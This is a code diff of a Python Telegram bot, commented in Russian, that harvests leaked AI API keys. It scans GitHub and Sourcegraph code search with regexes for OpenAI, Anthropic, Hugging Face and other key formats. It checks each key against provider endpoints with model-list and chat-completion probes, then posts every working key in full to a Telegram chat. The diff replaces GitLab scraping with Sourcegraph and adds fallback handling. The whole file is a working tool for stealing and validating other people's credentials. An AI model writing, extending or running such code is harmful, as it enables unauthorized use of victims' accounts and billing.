@@ -7,6 +7,7 @@ import logging
 import asyncio
 import random
 import sqlite3
+import json
 from concurrent.futures import ThreadPoolExecutor
 
 from telegram import Update
@@ -17,13 +18,11 @@ logger = logging.getLogger(__name__)
 
 BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
-GITLAB_TOKEN = os.getenv("GITLAB_TOKEN", "") # Токен GitLab
 CHAT_ID = os.getenv("CHAT_ID")
 
 TOTAL_RUN_TIME = 3600
 REPORT_INTERVAL = 900
 
-# Паттерны ключей
 KEY_PATTERNS = [
     {"provider": "openai",      "regex": re.compile(r"\bsk-proj-[A-Za-z0-9_-]{20,}\b")},
     {"provider": "anthropic",   "regex": re.compile(r"\bsk-ant-(?:api\d{2}-)?[A-Za-z0-9_-]{20,}\b")},
@@ -80,40 +79,28 @@ def mark_dead(key):
 repo_url_cache = {}
 
 def get_urls_from_repo_configs(repo):
-    if repo in repo_url_cache:
-        return repo_url_cache[repo]
-        
+    if repo in repo_url_cache: return repo_url_cache[repo]
     found_urls = []
     try:
         tree_url = f"https://api.github.com/repos/{repo}/git/trees/HEAD?recursive=1"
         resp = requests.get(tree_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}"}, timeout=10)
-        
         if resp.status_code == 200:
-            tree = resp.json().get("tree", [])
-            config_files = []
-            for item in tree:
+            for item in resp.json().get("tree", []):
                 if item["type"] == "blob" and any(x in item["path"].lower() for x in ['.env', 'config', 'settings']):
-                    config_files.append(item["path"])
-            
-            for path in config_files[:3]:
-                file_url = f"https://api.github.com/repos/{repo}/contents/{path}"
-                f_resp = requests.get(file_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
-                
-                if f_resp.status_code == 200:
-                    urls = URL_REGEX.findall(f_resp.text)
-                    for u in urls:
-                        if any(x in u for x in ['github.com', 'telegram', 'w3.org']): continue
-                        match = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
-                        if match: found_urls.append(match.group(1))
+                    file_url = f"https://api.github.com/repos/{repo}/contents/{item['path']}"
+                    f_resp = requests.get(file_url, headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=5)
+                    if f_resp.status_code == 200:
+                        for u in URL_REGEX.findall(f_resp.text):
+                            if any(x in u for x in ['github.com', 'telegram', 'w3.org']): continue
+                            match = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
+                            if match: found_urls.append(match.group(1))
     except: pass
-        
     repo_url_cache[repo] = list(set(found_urls))
     return repo_url_cache[repo]
 
 def fetch_github_targets():
     logger.info("🐙 Ищу ключи на GitHub...")
     headers = {"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github+json"}
-    
     queries = ["sk-proj- language:Python", "sk-ant-api03- language:Python", "sk-kimi- language:Python", "sk-cp- language:Python", "sk-sp- language:Python", "hf_ language:Python", "sk- language:JSON", "sk- language:YAML"]
     query = random.choice(queries)
     page = random.randint(1, 10) 
@@ -123,148 +110,126 @@ def fetch_github_targets():
         if resp.status_code == 403: return []
         resp.raise_for_status()
         
-        items = resp.json().get("items", [])
         targets = []
-        
-        for item in items[:30]:
-            repo = item["repository"]["full_name"]
-            path = item["path"]
+        for item in resp.json().get("items", [])[:30]:
+            repo, path = item["repository"]["full_name"], item["path"]
             file_resp = requests.get(f"https://api.github.com/repos/{repo}/contents/{path}", headers={"Authorization": f"Bearer {GITHUB_TOKEN}", "Accept": "application/vnd.github.raw+json"}, timeout=10)
             
             if file_resp.status_code == 200:
-                lines = file_resp.text.split('\n')
-                for line in lines:
+                for line in file_resp.text.split('\n'):
                     for p in KEY_PATTERNS:
                         for match in p["regex"].finditer(line):
                             token = match.group(0)
                             api_urls = []
                             
-                            # ПРИОРИТЕТ 1: URL прямо в этой же строке
-                            urls = URL_REGEX.findall(line)
-                            for u in urls:
+                            # 1. URL в строке
+                            for u in URL_REGEX.findall(line):
                                 if any(x in u for x in ['github.com', 'telegram', 'w3.org', '.jpeg', '.png']): continue
                                 match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
                                 if match_url: api_urls.append(match_url.group(1))
                             
-                            # ПРИОРИТЕТ 2: Жесткий префикс ключа (для всех известных провайдеров)
+                            # 2. Префикс ключа
                             if not api_urls and p["provider"] != "generic-sk":
                                 api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
                             
-                            # ПРИОРИТЕТ 3: URL в конфигах репозитория
+                            # 3. Конфиги репо (Trees API)
                             if not api_urls:
                                 api_urls.extend(get_urls_from_repo_configs(repo)[:1])
                             
-                            # ПРИОРИТЕТ 4: Название переменной (только если всё остальное не сработало)
+                            # 4. Переменная
                             if not api_urls:
-                                var_match = re.search(r'([A-Za-z0-9_]+)\s*=', line)
-                                var_name = var_match.group(1).lower() if var_match else ""
+                                var_name = re.search(r'([A-Za-z0-9_]+)\s*=', line).group(1).lower() if re.search(r'([A-Za-z0-9_]+)\s*=', line) else ""
                                 for hint, url in REPO_HINTS.items():
                                     if hint in var_name: api_urls.append(url); break
                                 if not api_urls:
                                     if "openai" in var_name: api_urls.append(PROVIDER_ENDPOINTS["openai"])
                                     elif "anthropic" in var_name: api_urls.append(PROVIDER_ENDPOINTS["anthropic"])
                             
-                            # ПРИОРИТЕТ 5: Название репозитория
+                            # 5. Имя репо
                             if not api_urls:
                                 combined = (repo + " " + path).lower()
                                 for hint, url in REPO_HINTS.items():
                                     if hint in combined: api_urls.append(url); break
                                     
-                            # ПРИОРИТЕТ 6: Дефолт
+                            # 6. Дефолт
                             if not api_urls:
                                 api_urls.append(PROVIDER_ENDPOINTS["default"])
                                 
                             for url in list(set(api_urls))[:1]:
-                                if url: # Проверка на None
-                                    targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
+                                if url: targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
             time.sleep(0.2) 
             
-        unique_targets = []
-        seen = set()
+        unique_targets, seen = [], set()
         for t in targets:
             sig = f"{t['key']}_{t['endpoint']}"
-            if sig not in seen:
-                seen.add(sig)
-                unique_targets.append(t)
+            if sig not in seen: seen.add(sig); unique_targets.append(t)
         return unique_targets
     except Exception as e:
         logger.error(f"❌ Ошибка GitHub: {e}")
         return []
 
-# ─── ПАРСИНГ GITLAB ────────────────────────────────────────────────────────
-def fetch_gitlab_targets():
-    logger.info("🦊 Ищу ключи на GitLab...")
-    headers = {"PRIVATE-TOKEN": GITLAB_TOKEN} if GITLAB_TOKEN else {}
+# ─── ПАРСИНГ SOURCEGRAPH ───────────────────────────────────────────────────
+def fetch_sourcegraph_targets():
+    logger.info("🌐 Ищу ключи на Sourcegraph (GitHub, GitLab, Bitbucket)...")
+    query = 'sk-[a-zA-Z0-9_-]{20,} patternType:regexp count:50'
+    url = "https://sourcegraph.com/.api/search/stream"
+    headers = {"Accept": "text/event-stream"}
+    params = {"q": query, "v": "V3"}
     
-    queries = ["sk-proj-", "sk-ant-", "hf_", "sk-"]
-    query = random.choice(queries)
-    page = random.randint(1, 10)
-    
+    targets = []
     try:
-        url = "https://gitlab.com/api/v4/search"
-        params = {"scope": "blobs", "search": query, "per_page": 30, "page": page}
-        resp = requests.get(url, headers=headers, params=params, timeout=15)
-        
+        resp = requests.get(url, headers=headers, params=params, stream=True, timeout=30)
         if resp.status_code != 200:
-            logger.error(f"❌ GitLab API: {resp.status_code}")
-            return []
+            logger.warning(f"⚠️ Sourcegraph вернул {resp.status_code}")
+            return [], False # Возвращаем False при падении
             
-        items = resp.json()
-        targets = []
-        
-        for item in items:
-            snippet = item.get("data", "")
-            if not snippet: continue
+        for line in resp.iter_lines(decode_unicode=True):
+            if not line or line.startswith("event:"): continue
+            if line.startswith("data: "):
+                try: data = json.loads(line[6:])
+                except json.JSONDecodeError: continue
                 
-            lines = snippet.split('\n')
-            for line in lines:
-                for p in KEY_PATTERNS:
-                    for match in p["regex"].finditer(line):
-                        token = match.group(0)
-                        api_urls = []
-                        
-                        urls = URL_REGEX.findall(line)
-                        for u in urls:
-                            if any(x in u for x in ['github.com', 'gitlab.com', 'telegram', 'w3.org', '.jpeg']): continue
-                            match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
-                            if match_url: api_urls.append(match_url.group(1))
+                for match in data:
+                    if match.get("type") != "content" or not match.get("lineMatches"): continue
+                    line_text = match["lineMatches"][0].get("line", "")
+                    if not line_text: continue
+                    
+                    for p in KEY_PATTERNS:
+                        for m in p["regex"].finditer(line_text):
+                            token = m.group(0)
+                            api_urls = []
                             
-                        if not api_urls and p["provider"] in ["openai", "anthropic", "huggingface"]:
-                            api_urls.append(PROVIDER_ENDPOINTS[p["provider"]])
+                            for u in URL_REGEX.findall(line_text):
+                                if any(x in u for x in ['github.com', 'gitlab.com', 'telegram', 'w3.org']): continue
+                                match_url = re.search(r'(.*?/v\d+(?:beta\d*)?|.*?/api)', u)
+                                if match_url: api_urls.append(match_url.group(1))
                             
-                        if not api_urls:
-                            combined = item.get("path_with_namespace", "").lower()
-                            for hint, hint_url in REPO_HINTS.items():
-                                if hint in combined: api_urls.append(hint_url); break
+                            if not api_urls and p["provider"] != "generic-sk":
+                                api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"]))
                                 
-                        if not api_urls:
-                            api_urls.append(PROVIDER_ENDPOINTS.get(p["provider"], PROVIDER_ENDPOINTS["default"]))
-                            
-                        for url in list(set(api_urls))[:1]:
-                            targets.append({"key": token, "endpoint": url.rstrip('/'), "provider": p["provider"]})
-                            
-        unique_targets = []
-        seen = set()
+                            if not api_urls:
+                                api_urls.append(PROVIDER_ENDPOINTS["default"])
+                                
+                            for url_ep in list(set(api_urls))[:1]:
+                                if url_ep: targets.append({"key": token, "endpoint": url_ep.rstrip('/'), "provider": p["provider"]})
+                                
+        unique_targets, seen = [], set()
         for t in targets:
             sig = f"{t['key']}_{t['endpoint']}"
-            if sig not in seen:
-                seen.add(sig)
-                unique_targets.append(t)
-        
-        logger.info(f"🦊 GitLab: извлечено пар: {len(unique_targets)}")
-        return unique_targets
+            if sig not in seen: seen.add(sig); unique_targets.append(t)
+            
+        logger.info(f"🌐 Sourcegraph: извлечено пар: {len(unique_targets)}")
+        return unique_targets, True # Возвращаем True при успехе
     except Exception as e:
-        logger.error(f"❌ Ошибка GitLab: {e}")
-        return []
+        logger.error(f"❌ Ошибка Sourcegraph: {e}")
+        return [], False
 
 # ─── ПРОВЕРКА ──────────────────────────────────────────────────────────────
 def check_endpoint(api_key, endpoint):
     try:
         resp = requests.get(f"{endpoint}/models", headers={"Authorization": f"Bearer {api_key}"}, timeout=10)
-        if resp.status_code == 200:
-            return {"status": "ok", "models": [m.get("id", "") for m in resp.json().get("data", [])]}
-        elif resp.status_code == 429:
-            return {"status": "429", "models": []}
+        if resp.status_code == 200: return {"status": "ok", "models": [m.get("id", "") for m in resp.json().get("data", [])]}
+        elif resp.status_code == 429: return {"status": "429", "models": []}
     except: pass
     return {"status": "dead", "models": []}
 
@@ -275,16 +240,14 @@ def probe_single(api_key, endpoint, model):
         resp = requests.post(f"{endpoint}/chat/completions", headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}, json=payload, timeout=10)
         latency = round(time.perf_counter() - start, 2)
         if resp.status_code == 200: return {"model": model, "ok": True, "latency": latency, "status": 200}
-        elif resp.status_code == 429: return {"model": model, "ok": True, "latency": latency, "status": 429, "msg": "Rate Limit"}
+        elif resp.status_code == 429: return {"model": model, "ok": True, "latency": latency, "status": 429}
     except: pass
     return {"model": model, "ok": False, "latency": "?", "status": "ERR"}
 
 def probe_models(api_key, endpoint, models):
     with ThreadPoolExecutor(max_workers=5) as executor:
-        results = list(executor.map(lambda m: probe_single(api_key, endpoint, m), models[:5]))
-    return results
+        return list(executor.map(lambda m: probe_single(api_key, endpoint, m), models[:5]))
 
-# ─── ОТЧЕТЫ ────────────────────────────────────────────────────────────────
 def format_report(key, endpoint, models, probes):
     working = [p for p in probes if p["ok"]]
     if not working: return None
@@ -296,45 +259,49 @@ def format_report(key, endpoint, models, probes):
     if len(models) > 5: lines.append(f"и ещё {len(models) - 5} за кадром")
     return "\n".join(lines)
 
+# ─── ГЛАВНЫЙ ЦИКЛ ──────────────────────────────────────────────────────────
 async def long_scan_loop():
     init_db()
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     start_time = time.time()
     cycle_start_time = time.time()
-    total_checked = 0
-    total_working = 0
-    cycle_working = 0
+    
+    total_checked, total_working, cycle_working = 0, 0, 0
+    sg_failures = 0 # Счетчик падений Sourcegraph
     
     logger.info(f"🚀 Запущен длинный скан на {TOTAL_RUN_TIME//60} минут.")
     
     while time.time() - start_time < TOTAL_RUN_TIME:
-        # 50/50: либо GitHub, либо GitLab
-        if random.choice([True, False]):
+        # Если 3 падения подряд - уходим на GitHub
+        if sg_failures >= 3:
             targets = await asyncio.to_thread(fetch_github_targets)
         else:
-            targets = await asyncio.to_thread(fetch_gitlab_targets)
-            
+            targets, sg_ok = await asyncio.to_thread(fetch_sourcegraph_targets)
+            if not sg_ok:
+                sg_failures += 1
+                logger.warning(f"⚠️ Сбой Sourcegraph ({sg_failures}/3). Пока переключаюсь на GitHub.")
+                targets = await asyncio.to_thread(fetch_github_targets)
+            else:
+                sg_failures = 0 # Сбрасываем счетчик при успехе
+                
         total_checked += len(targets)
         
         for t in targets:
             key, endpoint = t["key"], t["endpoint"]
-            
             if is_dead(key): continue
                 
             logger.info(f"Проверяю {key[:10]}... на {endpoint}")
             chk = await asyncio.to_thread(check_endpoint, key, endpoint)
             
             if chk["status"] == "dead":
-                logger.info("   └ ❌ Мертвый (нет доступа к /models)")
+                logger.info("   └ ❌ Мертвый")
                 mark_dead(key)
                 continue
-                
             if chk["status"] == "429":
                 logger.info("   └ ⚠️ Rate Limit (ключ живой)")
-                report = f"⚠️ Ключ с лимитом\n🌐 {endpoint}\n🗝 {key}\n(Модели не проверены из-за 429)"
+                report = f"⚠️ Ключ с лимитом\n🌐 {endpoint}\n🗝 {key}"
                 if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report)
-                total_working += 1
-                cycle_working += 1
+                total_working += 1; cycle_working += 1
                 continue
                 
             logger.info(f"   └ ✅ Доступно моделей: {len(chk['models'])}. Делаю пробы...")
@@ -342,9 +309,7 @@ async def long_scan_loop():
             report = format_report(key, endpoint, chk["models"], probes)
             
             if report:
-                total_working += 1
-                cycle_working += 1
-                # Убрали parse_mode="Markdown", чтобы избежать вылетов!
+                total_working += 1; cycle_working += 1
                 if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=report)
                 logger.info("   └ 🏆 ОТПРАВЛЕН РАБОЧИЙ КЛЮЧ!")
             else:
@@ -359,8 +324,7 @@ async def long_scan_loop():
             
         await asyncio.sleep(5)
 
-    if CHAT_ID:
-        await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Всего рабочих: {total_working}")
+    if CHAT_ID: await app.bot.send_message(chat_id=CHAT_ID, text=f"🛑 Час прошел. Всего рабочих: {total_working}")
     logger.info("✅ Сессия завершена.")
 
 if __name__ == "__main__":
